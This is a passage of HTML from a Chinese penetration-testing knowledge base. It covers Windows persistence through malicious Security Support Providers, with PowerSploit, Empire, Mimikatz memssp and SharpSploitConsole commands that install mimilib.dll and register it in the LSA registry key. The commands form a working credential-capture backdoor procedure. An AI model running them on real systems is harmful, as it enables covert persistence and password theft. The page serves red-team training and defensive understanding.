<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Import</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Module </span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">\PowerSploit</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">psm1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Install</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">SSP </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Path </span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">\mimilib</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dll</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="PowerSploit –安装SSP" src="/assets/images/894761-20191111133946939-1698762253-d8f311b3d1f94f26f739447fc4021108.png" width="797" height="292" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="empire-2">Empire<a href="#empire-2" class="hash-link" aria-label="Empire的直接链接" title="Empire的直接链接">​</a></h3>
<p>Empire提供了两个模块，可用于枚举现有的SSP并在目标系统上安装恶意的SSP。默认情况下，枚举模块将使用活动代理，并且不需要任何其他配置。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">usemodule persistence/misc/get_ssps</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">execute</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="Empire – SSP 枚举" src="/assets/images/894761-20191111133747470-1690785944-af5da7ea6e584a3541f464c3156806e5.png" width="1024" height="379" class="img_ev3q"></p>
<p>同样，直接查询注册表可以获取存在的SSP的值。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">shell reg query hklm\system\currentcontrolset\control\lsa\ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v </span><span class="token string" style="color:#e3116c">&quot;Security Packages&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="注册表SSP的枚举注册表" src="/assets/images/894761-20191111133806575-1829369263-c49293174c42f8ce151688ad1096dba4.png" width="928" height="198" class="img_ev3q"></p>
<p>将恶意安全支持提供程序复制到System32并更新注册表项将结束该技术。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">shell copy mimilib</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dll C</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">\Windows\System32\</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt=" 将mimilib.dll复制到System32" src="/assets/images/894761-20191111133823263-1377394559-3c086e64232c115cf2b74faffe614cab.png" width="691" height="157" class="img_ev3q"></p>
<p>由于Empire包含一个模块，该过程可以自动进行，该模块将自动将DLL文件复制到System32并创建注册表项。唯一的要求是在主机上设置mimilib.dll文件的路径。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">usemodule persistence</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">misc</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">install_ssp</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin">set</span><span class="token plain"> Path C</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">\Users\Administrator\mimilib</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">execute</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt=" Empire SSP安装" src="/assets/images/894761-20191111133839474-1905556008-52916657c081e6c5aec1d3436a1963d6.png" width="948" height="249" class="img_ev3q"></p>
<p>Empire还支持可以执行自定义Mimikatz命令的脚本。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">usemodule credentials</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">mimikatz</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">command</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin">set</span><span class="token plain"> Command misc</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">memssp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">execute</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="Mimikatz – SSP命令" src="/assets/images/894761-20191111133858316-1276814399-bfce5be63db16847e510718f2254226e.png" width="840" height="185" class="img_ev3q"></p>
<p>Empire还支持在进程的内存中注入恶意SSP。下面的模块将调用Mimikatz脚本并直接执行memssp命令，作为使该技术自动化的另一种方法。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">usemodule persistence</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">misc</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">memssp</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">execute</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="Empire – memssp" src="/assets/images/894761-20191111133913930-1307143695-f7ebb5d8c1b8e947b3ffab848faf481d.png" width="772" height="182" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="sharpsploitconsole">SharpSploitConsole<a href="#sharpsploitconsole" class="hash-link" aria-label="SharpSploitConsole的直接链接" title="SharpSploitConsole的直接链接">​</a></h3>
<p>Mimikatz已集成到<a href="https://github.com/anthemtotheego/SharpSploitConsole" target="_blank" rel="noopener noreferrer">SharpSploitConsole中</a>，该应用程序旨在与<a href="https://twitter.com/cobbr_io/" target="_blank" rel="noopener noreferrer">Ryan Cobb</a>发布的<a href="https://github.com/cobbr/SharpSploit" target="_blank" rel="noopener noreferrer">SharpSploit</a>进行交互。SharpSploit是一个.NET后期开发库，具有与PowerSploit类似的功能。当前，SharpSploitConsole通过Mimikatz模块支持内存技术。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SharpSploitConsole_x64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe Interact</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Mimi</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command misc</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">memssp</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111134004640-661005304-ac1d999e7777ac97ef8f600f04dd0f93.png" width="1024" height="580" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考链接">参考链接<a href="#参考链接" class="hash-link" aria-label="参考链接的直接链接" title="参考链接的直接链接">​</a></h2>
<ul>
<li><a href="https://mp.weixin.qq.com/s/MKN5JOiOg-Iwqztfmn2P7g" target="_blank" rel="noopener noreferrer">干货 | 最全Windows权限维持总结</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/11798030.html" target="_blank" rel="noopener noreferrer">Window权限维持（一）：注册表运行键</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/11797078.html" target="_blank" rel="noopener noreferrer">Window权限维持（二）：计划任务</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/11815957.html" target="_blank" rel="noopener noreferrer">Window权限维持（三）：服务</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/11833435.html" target="_blank" rel="noopener noreferrer">Window权限维持（四）：快捷方式修改</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/11833495.html" target="_blank" rel="noopener noreferrer">Window权限维持（五）：屏幕保护程序</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/11833583.html" target="_blank" rel="noopener noreferrer">Window权限维持（六）：BITS Jobs</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/11834327.html" target="_blank" rel="noopener noreferrer">Window权限维持（七）：安全支持提供者</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/11834403.html" target="_blank" rel="noopener noreferrer">Window权限维持（八）：时间服务器</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/11834481.html" target="_blank" rel="noopener noreferrer">Window权限维持（九）：端口监视器</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/11834533.html" target="_blank" rel="noopener noreferrer">Window权限维持（十）：Netsh Helper DLL</a></li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-14T04:13:25.000Z" itemprop="dateModified">2025年6月14日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/渗透测试/权限维持/Linux权限提升"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Linux权限提升</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/渗透测试/权限维持/Linux权限维持"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Linux权限维持</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#影子账号" class="table-of-contents__link toc-highlight">影子账号</a><ul><li><a href="#1-对注册表赋予权限" class="table-of-contents__link toc-highlight">1、 对注册表赋予权限</a></li><li><a href="#2创建特殊账户" class="table-of-contents__link toc-highlight">2、创建特殊账户</a></li><li><a href="#3导出注册表" class="table-of-contents__link toc-highlight">3、导出注册表</a></li><li><a href="#4删除特殊账户" class="table-of-contents__link toc-highlight">4、删除特殊账户</a></li><li><a href="#5导入reg文件" class="table-of-contents__link toc-highlight">5、导入reg文件</a></li><li><a href="#6大功告成" class="table-of-contents__link toc-highlight">6、大功告成</a></li><li><a href="#7删除方法" class="table-of-contents__link toc-highlight">7、删除方法</a></li><li><a href="#8脚本自动化" class="table-of-contents__link toc-highlight">8、脚本自动化</a></li></ul></li><li><a href="#辅助功能镜像劫持" class="table-of-contents__link toc-highlight">辅助功能镜像劫持</a><ul><li><a href="#低版本" class="table-of-contents__link toc-highlight">低版本</a></li><li><a href="#高版本" class="table-of-contents__link toc-highlight">高版本</a><ul><li><a href="#什么是ifeo" class="table-of-contents__link toc-highlight">什么是IFEO</a></li><li><a href="#可视化修改" class="table-of-contents__link toc-highlight">可视化修改</a></li><li><a href="#命令行修改" class="table-of-contents__link toc-highlight">命令行修改</a></li></ul></li></ul></li><li><a href="#开机启动项" class="table-of-contents__link toc-highlight">开机启动项</a><ul><li><a href="#开始菜单启动项" class="table-of-contents__link toc-highlight">开始菜单启动项</a></li><li><a href="#组策略" class="table-of-contents__link toc-highlight">组策略</a></li><li><a href="#启动项注册表后门" class="table-of-contents__link toc-highlight">启动项注册表后门</a><ul><li><a href="#命令行" class="table-of-contents__link toc-highlight">命令行</a></li><li><a href="#metasploit" class="table-of-contents__link toc-highlight">Metasploit</a></li><li><a href="#sharpersist" class="table-of-contents__link toc-highlight">SharPersist</a></li><li><a href="#poshc2" class="table-of-contents__link toc-highlight">PoshC2</a></li><li><a href="#empire" class="table-of-contents__link toc-highlight">Empire</a></li></ul></li></ul></li><li><a href="#计划任务" class="table-of-contents__link toc-highlight">计划任务</a></li><li><a href="#服务" class="table-of-contents__link toc-highlight">服务</a><ul><li><a href="#创建服务" class="table-of-contents__link toc-highlight">创建服务</a><ul><li><a href="#cmd直接创建服务" class="table-of-contents__link toc-highlight">CMD直接创建服务</a></li><li><a href="#powershell创建服务" class="table-of-contents__link toc-highlight">Powershell创建服务</a></li><li><a href="#其他" class="table-of-contents__link toc-highlight">其他</a></li><li><a href="#其他的一些工具" class="table-of-contents__link toc-highlight">其他的一些工具</a><ul><li><a href="#sharpersist-1" class="table-of-contents__link toc-highlight">SharPersist</a></li><li><a href="#powersploit" class="table-of-contents__link toc-highlight">PowerSploit</a></li><li><a href="#poshc2-1" class="table-of-contents__link toc-highlight">PoshC2</a></li><li><a href="#metasploit-1" class="table-of-contents__link toc-highlight">Metasploit</a></li></ul></li></ul></li><li><a href="#telnet服务" class="table-of-contents__link toc-highlight">telnet服务</a></li></ul></li><li><a href="#快捷方式" class="table-of-contents__link toc-highlight">快捷方式</a><ul><li><a href="#什么是lnk" class="table-of-contents__link toc-highlight">什么是LNK</a></li><li><a href="#利用手法" class="table-of-contents__link toc-highlight">利用手法</a></li><li><a href="#利用过程" class="table-of-contents__link toc-highlight">利用过程</a><ul><li><a href="#直接修改放置启动目录" class="table-of-contents__link toc-highlight">直接修改，放置启动目录</a></li><li><a href="#同时启动两个程序" class="table-of-contents__link toc-highlight">同时启动两个程序</a></li></ul></li><li><a href="#一些辅助工具" class="table-of-contents__link toc-highlight">一些辅助工具</a><ul><li><a href="#empire-1" class="table-of-contents__link toc-highlight">Empire</a></li><li><a href="#sharpersist-2" class="table-of-contents__link toc-highlight">SharPersist</a></li><li><a href="#poshc2-2" class="table-of-contents__link toc-highlight">PoshC2</a></li></ul></li></ul></li><li><a href="#dll劫持" class="table-of-contents__link toc-highlight">DLL劫持</a><ul><li><a href="#介绍" class="table-of-contents__link toc-highlight">介绍</a></li><li><a href="#时间服务器" class="table-of-contents__link toc-highlight">时间服务器</a><ul><li><a href="#补充说明" class="table-of-contents__link toc-highlight">补充说明</a></li></ul></li><li><a href="#print-spooler端口监视器" class="table-of-contents__link toc-highlight">Print Spooler端口监视器</a></li><li><a href="#netsh-helper-dll" class="table-of-contents__link toc-highlight">Netsh Helper DLL</a></li></ul></li><li><a href="#com劫持" class="table-of-contents__link toc-highlight">COM劫持</a><ul><li><a href="#介绍-1" class="table-of-contents__link toc-highlight">介绍</a></li><li><a href="#持久化" class="table-of-contents__link toc-highlight">持久化</a><ul><li><a href="#计划任务-1" class="table-of-contents__link toc-highlight">计划任务</a></li></ul></li><li><a href="#参考文章" class="table-of-contents__link toc-highlight">参考文章</a></li></ul></li><li><a href="#winlogon用户登录初始化" class="table-of-contents__link toc-highlight">Winlogon用户登录初始化</a></li><li><a href="#logon-scripts后门" class="table-of-contents__link toc-highlight">Logon Scripts后门</a></li><li><a href="#文件关联打开方式" class="table-of-contents__link toc-highlight">文件关联（打开方式）</a></li><li><a href="#bitsadmin" class="table-of-contents__link toc-highlight">Bitsadmin</a></li><li><a href="#进程注入" class="table-of-contents__link toc-highlight">进程注入</a></li><li><a href="#屏幕保护程序" class="table-of-contents__link toc-highlight">屏幕保护程序</a></li><li><a href="#wmi构造无文件后门" class="table-of-contents__link toc-highlight">WMI构造无文件后门</a></li><li><a href="#安全支持提供者" class="table-of-contents__link toc-highlight">安全支持提供者</a><ul><li><a href="#mimikatz" class="table-of-contents__link toc-highlight">Mimikatz</a><ul><li><a href="#方法一" class="table-of-contents__link toc-highlight">方法一</a></li><li><a href="#方法二" class="table-of-contents__link toc-highlight">方法二</a></li></ul></li><li><a href="#powersploit-1" class="table-of-contents__link toc-highlight">PowerSploit</a></li><li><a href="#empire-2" class="table-of-contents__link toc-highlight">Empire</a></li><li><a href="#sharpsploitconsole" class="table-of-contents__link toc-highlight">SharpSploitConsole</a></li></ul></li><li><a href="#参考链接" class="table-of-contents__link toc-highlight">参考链接</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li><li class="footer__item"><a class="footer__link-item" href="/promotions">我的推广</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>